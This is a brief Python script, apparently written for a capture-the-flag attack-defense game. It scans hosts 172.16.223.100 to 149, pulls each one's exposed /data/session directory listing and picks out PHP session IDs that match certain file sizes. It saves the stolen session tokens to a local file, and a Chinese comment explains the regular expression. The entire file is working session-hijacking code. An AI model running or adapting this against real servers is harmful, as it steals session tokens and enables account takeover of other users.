import re
import requests
import time
file = open(r'I:\python visual studio code\ctf\cookie.txt', 'w+')
file.write(str(''))
for u in range(100,150):
    url = 'http://172.16.223.'+str(u)+'/data/session'
    xx = requests.get(url).text
    cookie = re.findall(r'>sess_(.+)</a>.+"right">(.+?)</td>', xx)
#中间的.+表示两个正则中间还有字符。.是所以字符，+是匹配前面的子表达式一次或多次(就是匹配.号)
# print(cookie)
    for y in cookie:
        # print(y[1])
        if y[1] == '188 ' or y[1] == '190 ':
            print(y[0])
            file = open(r'I:\python visual studio code\ctf\cookie.txt', 'a+')        
            file.write(str(u)+':'+y[0]+'\n')
            file.close()


